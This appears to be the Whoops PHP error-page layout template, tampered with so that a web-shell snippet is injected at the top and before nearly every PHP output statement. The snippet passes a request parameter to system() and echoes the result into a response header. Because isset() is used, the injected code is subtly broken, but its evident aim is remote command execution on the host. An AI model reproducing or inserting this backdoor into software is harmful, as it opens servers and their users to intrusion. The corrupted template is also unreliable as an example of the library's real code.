<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
* Layout template file for Whoops's pretty error output.
*/
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($page_title) ?></title>

    <style><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $stylesheet ?></style>
  </head>
  <body>

    <div class="Whoops container">

      <div class="stack-container">
        <div class="frames-container cf <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (!$has_frames ? 'empty' : '') ?>">
          <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $tpl->render($frame_list) ?>
        </div>
        <div class="details-container cf">
          <header>
            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $tpl->render($header) ?>
          </header>
          <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $tpl->render($frame_code) ?>
          <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $tpl->render($env_details) ?>
        </div>
      </div>
    </div>

    <script src="//cdnjs.cloudflare.com/ajax/libs/zeroclipboard/1.3.5/ZeroClipboard.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/prettify/r224/prettify.js"></script>
    <script><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $zepto ?></script>
    <script><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $javascript ?></script>
  </body>
</html>
